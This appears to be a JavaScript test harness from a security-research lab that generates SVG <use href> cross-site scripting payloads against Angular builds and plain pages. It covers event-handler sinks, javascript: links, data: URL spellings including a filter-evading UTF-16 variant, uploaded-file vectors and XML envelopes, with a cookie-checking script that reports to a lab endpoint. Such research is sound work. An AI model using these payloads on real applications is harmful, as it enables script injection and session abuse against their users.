// Attacker corpus for SVG <use href> in Angular.
//
// Two layers run in the same browser session against the same origin:
//
//   angular  the AOT builds in .lab/angular{20,21,22}. Their components hold
//            hardcoded URLs, so the attacker's variable is what the origin
//            returns for /asset.svg, not the bound string.
//   html     a page served from the same origin with no Angular on it. The
//            bound string is the variable here, which is what makes every
//            data: spelling measurable without recompiling Angular.
//
// Recording both separates "the browser loaded it" from "Angular let it
// through". A row that executes in html but not in angular is a browser
// result; a row that executes in both is the application-level finding.

export const MARKER = '__ngSvgXss';
export const CANARY = 'ngsvgcanary';
export const PROBE_PATH = '/__probe/reach';

// Where the lab's own bytes live. None of these paths exist on disk; the lab
// origin answers them from memory.
export const ASSET_PATH = '/asset.svg';
export const SAFE_PATH = '/safe.svg';

function xmlAttribute(value) {
  return value
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

// The XSS itself: what the handler does when it runs, one statement per line.
//
// It reads only lab-owned state -- the canary cookie this lab set on this
// loopback origin and the Angular root element -- and sends one credentialed
// request to a lab endpoint, which the origin logs with the cookie it carried.
// That request is how a row shows session-bearing reach rather than a handler
// that was merely parsed.
//
// It also records *where* it ran. A handler on a node cloned into the <use>
// shadow tree belongs to the page; a handler on a node of the external SVG
// document belongs to that document, even if its global is the page's window.
// elDoc, root and sameDoc tell those apart.
//
// Blink and Gecko name an SVG handler's argument `evt`, not `event`, and
// window.event stays unset when the target sits in another document, so the
// event is read from whichever name is bound. A trusted event is one the
// browser dispatched itself.
//
// The script avoids &, <, > and " so it needs no XML escaping and reads the same
// in the served SVG as here, and it has no // comments: attribute-value
// normalization joins the lines, and a line comment would swallow the rest.
export function impactScript(sink) {
  return [
    'var node = this;',
    "var fired = typeof evt !== 'undefined' ? evt : typeof event !== 'undefined' ? event : null;",
    "function read(get) { try { return get(); } catch (error) { return 'denied'; } }",
    'var report = {',
    "  sink: '" + sink + "',",
    '  origin: read(function () { return top.location.origin; }),',
    '  path: read(function () { return top.location.pathname; }),',
    '  topIsSelf: read(function () { return top === window; }),',
    '  elDoc: read(function () { return node.ownerDocument.URL; }),',
    '  globalDoc: read(function () { return window.document.URL; }),',
    '  sameDoc: read(function () { return node.ownerDocument === window.document; }),',
    '  root: read(function () {',
    '    var root = node.getRootNode();',
    "    return root.host ? 'shadow:' + root.host.localName : root.nodeType === 9 ? 'document' : root.nodeName;",
    '  }),',
    '  event: fired ? fired.type : null,',
    '  trusted: fired ? fired.isTrusted : null,',
    "  cookie: read(function () { return top.document.cookie.indexOf('" + CANARY + "') !== -1; }),",
    "  appRoot: read(function () { return !!top.document.querySelector('app-root'); }),",
    '};',
    'report.fetched = read(function () {',
    "  top.fetch('" + PROBE_PATH + '/' + sink + "', { credentials: 'include' });",
    '  return true;',
    '});',
    'read(function () { (top.' + MARKER + ' = top.' + MARKER + ' || []).push(report); });',
  ].join('\n');
}

function indentLines(text, indent) {
  return text
    .split('\n')
    .map((line) => indent + line)
    .join('\n');
}

// An event-handler attribute holding the impact script. `indent` is the
// indentation of the element it sits on, so the script lines up under it.
function on(event, sink, indent) {
  return (
    event +
    '="\n' +
    xmlAttribute(indentLines(impactScript(sink), indent + '  ')) +
    '\n' +
    indent +
    '"'
  );
}

// The nested reference an onerror sink needs in order to fail.
//
// Inside a data: document there is no base URL, so a relative href never
// starts a load, never fails, and never fires onerror. A corpus that uses one
// scores the whole data: family as blocked for a reason that has nothing to do
// with the browser's <use> policy. These bytes are a valid data: URL that is
// not a decodable image, so the load is attempted and fails in every context.
export const FAILING_REFERENCE = 'data:image/png;base64,Zm9v';

// Each sink is a different way for an adopted subtree to reach script. They
// stay separate because engines diverge on exactly these.
//
// The two extra image-onerror variants exist to compare against Mozilla bug
// 1912763, whose testcase 1 is <image href="1" onerror=...>. That bug compared
// Chrome 71, 72 and the Chrome current in 2024; running the same markup here on
// every build shows whether a Chrome result depends on the reference type.
//
// Every payload carries a 40x40 rect: getBBox() on the <use> is the
// independent check that the browser adopted and laid out the document.
const RECT = '<rect width="40" height="40" fill="orange"/>';

function imageOnerror(id, sink, href) {
  return svgDocument(id, [RECT, '<image href="' + href + '" ' + on('onerror', sink, '  ') + '/>']);
}

// A reference that succeeds, so the handler fires without leaving a broken
// icon behind. Every onerror sink here needs a failed load, which is visible;
// this one is not, and it needs no interaction either.
const RESOLVING_REFERENCE =
  'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8DwHwAFAAH/q842iQAAAABJRU5ErkJggg==';

export const SINKS = {
  'image-onerror': (id) => imageOnerror(id, 'image-onerror', FAILING_REFERENCE),
  'image-onload': (id) =>
    svgDocument(id, [
      RECT,
      '<image href="' +
        RESOLVING_REFERENCE +
        '" width="10" height="10" ' +
        on('onload', 'image-onload', '  ') +
        '/>',
    ]),
  'image-onerror-relative': (id) => imageOnerror(id, 'image-onerror-relative', '1'),
  'image-onerror-404': (id) => imageOnerror(id, 'image-onerror-404', '/__missing'),
  'svg-onload': (id) => svgDocument(id, [RECT], on('onload', 'svg-onload', '')),
  'animate-onbegin': (id) =>
    svgDocument(id, [
      '<rect width="40" height="40" fill="orange">',
      '  <animate attributeName="opacity" from="1" to="1" dur="0.1s" begin="0s" ' +
        on('onbegin', 'animate-onbegin', '    ') +
        '/>',
      '</rect>',
    ]),
  'set-onbegin': (id) =>
    svgDocument(id, [
      '<rect width="40" height="40" fill="orange">',
      '  <set attributeName="opacity" to="1" begin="0s" ' +
        on('onbegin', 'set-onbegin', '    ') +
        '/>',
      '</rect>',
    ]),
  'foreign-img-onerror': (id) =>
    svgDocument(id, [
      RECT,
      '<foreignObject width="40" height="40">',
      '  <img xmlns="http://www.w3.org/1999/xhtml" src="' +
        FAILING_REFERENCE +
        '" ' +
        on('onerror', 'foreign-img-onerror', '    ') +
        '/>',
      '</foreignObject>',
    ]),
  'rect-onclick': (id) =>
    svgDocument(id, [
      '<rect width="40" height="40" fill="orange" ' + on('onclick', 'rect-onclick', '  ') + '/>',
    ]),
  // Fires with no resource load and no interaction. Every other no-interaction
  // sink here depends on a reference that fails, so a defence that strips
  // `on*` from uploaded files or refuses `<image>` would still leave this one.
  // `open="open"`: a valueless attribute is not well-formed XML.
  'details-ontoggle': (id) =>
    svgDocument(id, [
      RECT,
      '<foreignObject width="40" height="40">',
      '  <details xmlns="http://www.w3.org/1999/xhtml" open="open" ' +
        on('ontoggle', 'details-ontoggle', '    ') +
        '><summary>i</summary>x</details>',
      '</foreignObject>',
    ]),
  // Not a handler attribute: the cloned <a> is a live hyperlink. Activating it
  // is a navigation, which is why a `javascript:` target is the only form of it
  // this harness can score -- a navigation to an ordinary URL takes the page
  // away and leaves no finding behind.
  'anchor-javascript': (id) =>
    svgDocument(id, [
      '<a href="javascript:' +
        xmlAttribute(impactScript('anchor-javascript').replace(/\n/g, ' ')) +
        '">',
      '  <rect width="40" height="40" fill="orange"/>',
      '</a>',
    ]),
  // CDATA so that a later edit adding & or < to the script cannot break the XML
  // parse and score this sink as blocked for the wrong reason.
  'script-tag': (id) =>
    svgDocument(id, [
      RECT,
      '<script><![CDATA[\n' + indentLines(impactScript('script-tag'), '    ') + '\n  ]]></script>',
    ]),
};

// One element per line, two-space indent. `id` is omitted for the fragmentless
// cases, which is the point of those: a <use> with no fragment has to adopt the
// whole document.
function svgDocument(id, children, rootAttributes = '') {
  return [
    '<svg xmlns="http://www.w3.org/2000/svg"' +
      (id ? ' id="' + id + '"' : '') +
      ' viewBox="0 0 40 40" width="40" height="40"' +
      (rootAttributes ? ' ' + rootAttributes : '') +
      '>',
    ...children.map((child) => '  ' + child),
    '</svg>',
  ].join('\n');
}

// What the rest of the response looks like around the attacker's <svg>.
//
// `<use>` resolves a fragment to an element id, and the referenced element does
// not have to be the root: it can sit inside a document that is not an SVG
// document at all, as long as the whole response still parses as XML. These
// envelopes are the shapes an ordinary endpoint produces -- a feed, a SOAP
// body, a sitemap, an XML API, an XHTML page, a list of records -- with the
// attacker's subtree somewhere inside.
//
// The last three are the negative end: JSON is not XML, bytes before the root
// make the parse fail, and an <svg> with no namespace is not an SVG element.
export const ENVELOPES = {
  'xml-prologue': (svg) => '<?xml version="1.0" encoding="UTF-8"?>\n' + svg,
  'xml-trailing-bytes': (svg) => svg + '\nnot xml at all\n',
  'xml-rss': (svg) =>
    '<rss version="2.0"><channel><title>feed</title><item><description>' +
    svg +
    '</description></item></channel></rss>',
  'xml-soap': (svg) =>
    '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body>' +
    svg +
    '</soap:Body></soap:Envelope>',
  'xml-sitemap': (svg) =>
    '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"><url><loc>/a</loc></url>' +
    svg +
    '</urlset>',
  'xml-api': (svg) => '<response><status>ok</status><data>' + svg + '</data></response>',
  'xml-xhtml': (svg) =>
    '<html xmlns="http://www.w3.org/1999/xhtml"><body><p>profile</p>' + svg + '</body></html>',
  'xml-record-list': (svg) =>
    '<records><record id="1"><name>a</name></record><record id="2"><bio>' +
    svg +
    '</bio></record><record id="3"><name>c</name></record></records>',
  'xml-deep': (svg) => '<a xmlns="urn:lab:one"><b><c><d>' + svg + '</d></c></b></a>',
  'xml-json-envelope': (svg) => JSON.stringify({ ok: true, value: svg }),
  'xml-bytes-before-root': (svg) => 'name,value\nicon,1\n' + svg,
  'xml-no-namespace': (svg) => svg.replace(' xmlns="http://www.w3.org/2000/svg"', ''),
};

// Sinks that need a real pointer event. The harness clicks the bound <use>.
export const CLICK_SINKS = new Set(['rect-onclick', 'anchor-javascript']);

export function payload(sink = 'image-onerror', { id = 'x', wrap = null } = {}) {
  const build = SINKS[sink];
  if (!build) throw new Error('Unknown sink: ' + sink);
  const svg = build(id);
  if (!wrap) return svg;
  const envelope = ENVELOPES[wrap];
  if (!envelope) throw new Error('Unknown envelope: ' + wrap);
  return envelope(svg);
}

export const SAFE_SVG =
  '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 40 40" width="40" height="40">' +
  '<rect id="safe" width="40" height="40" fill="green"/></svg>';

// ---------------------------------------------------------------------------
// Route A: data: spellings. No server, no upload: a pasted string is enough.
// Each entry varies one property of the URL so a negative points at a cause.
// ---------------------------------------------------------------------------

function base64(text, { encoding = 'utf8' } = {}) {
  if (encoding === 'utf16') {
    // UTF-16LE with a BOM. XML parsers honour the BOM, so this is a valid SVG
    // document that does not look like one to a byte filter.
    return Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from(text, 'utf16le')]).toString(
      'base64',
    );
  }
  return Buffer.from(text, 'utf8').toString('base64');
}

function dataUrl(svg, options = {}) {
  const {
    mime = 'image/svg+xml',
    params = '',
    token = 'base64',
    scheme = 'data',
    encoding = 'utf8',
    percent = false,
    fragment = '#x',
    wrap = 0,
  } = options;
  if (percent) {
    return scheme + ':' + mime + params + ',' + encodeURIComponent(svg) + fragment;
  }
  let body = base64(svg, { encoding });
  if (wrap > 0) body = body.replace(new RegExp('(.{' + wrap + '})', 'g'), '$1\n');
  return scheme + ':' + mime + params + ';' + token + ',' + body + fragment;
}

function dataFamily(sink) {
  const svg = payload(sink);
  const noId = payload(sink, { id: '' });
  const entry = (id, note, url) => ({ id, note, url });
  return [
    entry('data-svg-base64', 'image/svg+xml, base64', dataUrl(svg)),
    entry('data-svg-percent', 'image/svg+xml, percent-encoded', dataUrl(svg, { percent: true })),
    entry('data-text-xml', 'text/xml', dataUrl(svg, { mime: 'text/xml' })),
    entry('data-application-xml', 'application/xml', dataUrl(svg, { mime: 'application/xml' })),
    entry('data-xhtml', 'application/xhtml+xml', dataUrl(svg, { mime: 'application/xhtml+xml' })),
    entry('data-mime-params', ';charset=utf-8', dataUrl(svg, { params: ';charset=utf-8' })),
    entry('data-token-upper', 'BASE64 token', dataUrl(svg, { token: 'BASE64' })),
    entry('data-scheme-mixed', 'DaTa: scheme', dataUrl(svg, { scheme: 'DaTa' })),
    entry('data-utf16-bom', 'UTF-16LE with BOM', dataUrl(svg, { encoding: 'utf16' })),
    entry('data-base64-wrapped', 'newlines inside base64', dataUrl(svg, { wrap: 76 })),
    entry('data-text-html', 'control: text/html', dataUrl(svg, { mime: 'text/html' })),
    entry('data-text-plain', 'control: text/plain', dataUrl(svg, { mime: 'text/plain' })),
    entry('data-image-png', 'control: image/png', dataUrl(svg, { mime: 'image/png' })),
    entry('data-no-mime', 'control: empty media type', dataUrl(svg, { mime: '' })),
    entry('data-fragmentless', 'control: no fragment', dataUrl(noId, { fragment: '' })),
    entry('data-wrong-fragment', 'control: #absent', dataUrl(svg, { fragment: '#absent' })),
    entry('javascript-url', 'control: javascript:', 'javascript:' + impactScript('javascript-url')),
  ];
}

// ---------------------------------------------------------------------------
// Route B: same-origin bytes. The attacker landed SVG markup on the app's exact
// scheme, host and port -- an ordinary avatar or attachment upload. The server
// decides bytes, media type and headers; every response is logged per row.
// ---------------------------------------------------------------------------

function originFamily(sink) {
  const cases = [];
  for (const mime of [
    'image/svg+xml',
    'text/xml',
    'application/xml',
    'image/png',
    'text/plain',
    'application/octet-stream',
    'text/html',
  ]) {
    cases.push({
      id: 'origin-' + mime.replace(/[^a-z0-9]+/g, '-'),
      note: mime + ', attachment, nosniff',
      resource: { mime, sink },
      url: ASSET_PATH + '#x',
    });
  }
  cases.push(
    {
      id: 'origin-fragmentless',
      note: 'no fragment, no id on the root',
      resource: { mime: 'image/svg+xml', sink, rootId: '' },
      url: ASSET_PATH,
    },
    {
      id: 'origin-png-path-svg-mime',
      note: 'image/svg+xml behind /uploads/avatar.png',
      resource: { mime: 'image/svg+xml', sink },
      url: '/uploads/avatar.png#x',
    },
    {
      id: 'origin-png-path-png-mime',
      note: 'image/png behind /uploads/avatar.png',
      resource: { mime: 'image/png', sink },
      url: '/uploads/avatar.png#x',
    },
    {
      id: 'origin-inline-sniff',
      note: 'inline, no nosniff',
      resource: { mime: 'image/svg+xml', sink, disposition: 'inline', nosniff: false },
      url: ASSET_PATH + '#x',
    },
    {
      id: 'origin-redirect-same',
      note: '302 to the payload on the same origin',
      resource: { mime: 'image/svg+xml', sink, redirect: 'same' },
      url: '/redirect/same#x',
    },
    {
      id: 'origin-redirect-cross',
      note: 'control: 302 to another origin',
      resource: { mime: 'image/svg+xml', sink, redirect: 'cross' },
      url: '/redirect/cross#x',
    },
    {
      id: 'origin-cross-port',
      note: 'control: sibling port',
      resource: { mime: 'image/svg+xml', sink },
      crossPort: true,
    },
    {
      id: 'origin-app-csp',
      note: "control: page CSP script-src 'self'",
      resource: { mime: 'image/svg+xml', sink },
      appCsp: true,
      url: ASSET_PATH + '#x',
    },
    {
      id: 'origin-resource-csp',
      note: 'CSP on the SVG response only',
      resource: { mime: 'image/svg+xml', sink, resourceCsp: "script-src 'none'; sandbox" },
      url: ASSET_PATH + '#x',
    },
  );
  return cases;
}

// Every case here is served as text/xml, a media type Chrome and Firefox
// accept, so the only thing that varies is the document around the <svg>.
function xmlFamily(sink) {
  return Object.keys(ENVELOPES).map((wrap) => ({
    id: wrap,
    note: 'text/xml, attacker <svg> inside a ' + wrap.replace('xml-', '') + ' document',
    resource: { mime: 'text/xml', sink, wrap },
    url: ASSET_PATH + '#x',
  }));
}

function sinkFamily() {
  return Object.keys(SINKS).map((sink) => ({
    id: 'sink-' + sink,
    note: 'same-origin image/svg+xml, ' + sink,
    resource: { mime: 'image/svg+xml', sink },
    sink,
    url: ASSET_PATH + '#x',
  }));
}

// Controls that answer "what does <use> add". The same bytes and headers as
// origin-image-svg-xml, reached without <use>: an ordinary <img>, and a
// top-level navigation to the file. With attachment the navigation becomes a
// download -- which the harness contains inside the throwaway profile -- so if
// those two stay silent while <use> executes, <use> is what turned an
// attachment into script.
//
// The attachment case runs last. Firefox over BiDi leaves the session stuck
// on the download, and every navigation after it times out.
function controlFamily(sink) {
  return [
    {
      id: 'control-img-only',
      note: '<img src> only, no <use>',
      resource: { mime: 'image/svg+xml', sink },
      url: ASSET_PATH + '#x',
      bindUse: false,
      withImg: true,
    },
    {
      id: 'control-direct-inline',
      note: 'top-level navigation, inline (ordinary stored SVG XSS)',
      resource: { mime: 'image/svg+xml', sink, disposition: 'inline' },
      navigate: ASSET_PATH,
    },
    {
      id: 'control-direct-attachment',
      note: 'top-level navigation, attachment',
      resource: { mime: 'image/svg+xml', sink },
      navigate: ASSET_PATH,
    },
  ];
}

const SUITES = {
  // The decisive cells: does a pasted string reach script, and does an
  // uploaded file reach script, on this browser.
  floor: (sink) => [
    ...dataFamily(sink).filter((entry) =>
      ['data-svg-base64', 'data-text-xml', 'data-fragmentless', 'javascript-url'].includes(
        entry.id,
      ),
    ),
    ...originFamily(sink).filter((entry) =>
      [
        'origin-image-svg-xml',
        'origin-image-png',
        'origin-fragmentless',
        'origin-app-csp',
      ].includes(entry.id),
    ),
  ],
  data: (sink) => dataFamily(sink),
  origin: (sink) => originFamily(sink),
  xml: (sink) => xmlFamily(sink),
  sinks: () => sinkFamily(),
  controls: (sink) => controlFamily(sink),
  full: (sink) => [
    ...dataFamily(sink),
    ...originFamily(sink),
    ...xmlFamily(sink),
    ...sinkFamily(),
    ...controlFamily(sink),
  ],
};

export const SUITE_NAMES = Object.keys(SUITES);

export function htmlVectors({ suite = 'floor', sink = 'image-onerror' } = {}) {
  const build = SUITES[suite];
  if (!build) throw new Error('Unknown suite: ' + suite + ' (use ' + SUITE_NAMES.join(', ') + ')');
  return build(sink).map((entry) => ({
    layer: 'html',
    sink: entry.sink || sink,
    family: entry.id.split('-')[0],
    ...entry,
  }));
}

export function angularVectors({ suite = 'floor', sink = 'image-onerror' } = {}) {
  const rows = [
    {
      id: 'ng-data-literal',
      route: 'data-svg',
      note: 'component binds a literal data: URL',
    },
    {
      id: 'ng-data-constructed',
      route: 'data-constructed',
      note: 'component builds the data: URL with btoa()',
    },
    {
      id: 'ng-origin-svg-mime',
      route: 'same-origin-svg',
      note: 'uploaded SVG, attachment, nosniff',
      resource: { mime: 'image/svg+xml', sink },
    },
    {
      id: 'ng-origin-xlink',
      route: 'same-origin-xlink',
      note: 'same bytes through [attr.xlink:href]',
      resource: { mime: 'image/svg+xml', sink },
    },
    {
      id: 'ng-origin-fragmentless',
      route: 'same-origin-fragmentless',
      note: 'uploaded SVG, nothing after the path in the binding',
      resource: { mime: 'image/svg+xml', sink, rootId: '' },
    },
    {
      id: 'ng-origin-png-mime',
      route: 'same-origin-svg',
      note: 'SVG bytes served as image/png',
      resource: { mime: 'image/png', sink },
    },
    {
      id: 'ng-inside-anchor',
      route: 'use-inside-anchor',
      note: "icon inside the app's own <a href>",
      resource: { mime: 'image/svg+xml', sink },
    },
    {
      id: 'ng-inside-button',
      route: 'use-inside-button',
      note: 'icon inside a <button (click)>',
      resource: { mime: 'image/svg+xml', sink },
    },
    {
      id: 'ng-fragment-only',
      route: 'fragment-only',
      note: 'control: only the fragment comes from data',
    },
    {
      id: 'ng-origin-app-csp',
      route: 'same-origin-svg',
      note: "control: page CSP script-src 'self'",
      resource: { mime: 'image/svg+xml', sink },
      appCsp: true,
    },
    {
      id: 'ng-safe-control',
      route: 'safe-sprite-and-img',
      note: 'control: reviewed sprite and an ordinary img',
    },
  ];
  let selected = rows;
  if (suite === 'floor') {
    selected = rows.filter(
      (row) =>
        row.id !== 'ng-origin-xlink' &&
        row.id !== 'ng-origin-png-mime' &&
        row.id !== 'ng-fragment-only' &&
        row.id !== 'ng-inside-anchor' &&
        row.id !== 'ng-inside-button',
    );
  } else if (suite === 'data') {
    selected = rows.filter((row) => row.route.startsWith('data'));
  } else if (suite === 'xml') {
    // One component, bound to one of the app's own XML endpoints, and the
    // envelope the endpoint returns is the variable. A row that executes here
    // and in the html layer is the application-level finding; without this the
    // envelope result would only ever be a browser result.
    selected = Object.keys(ENVELOPES).map((wrap) => ({
      id: 'ng-' + wrap,
      route: 'xml-endpoint',
      note: 'text/xml from /api/profile.xml, payload inside a ' + wrap.replace('xml-', ''),
      resource: { mime: 'text/xml', sink, wrap },
    }));
  } else if (suite === 'sinks' || suite === 'controls') {
    // These vary the handler, not the binding, and the Angular components hold
    // compiled-in URLs. The html layer carries them.
    selected = [];
  }
  return selected.map((row) => ({ layer: 'angular', sink, ...row }));
}
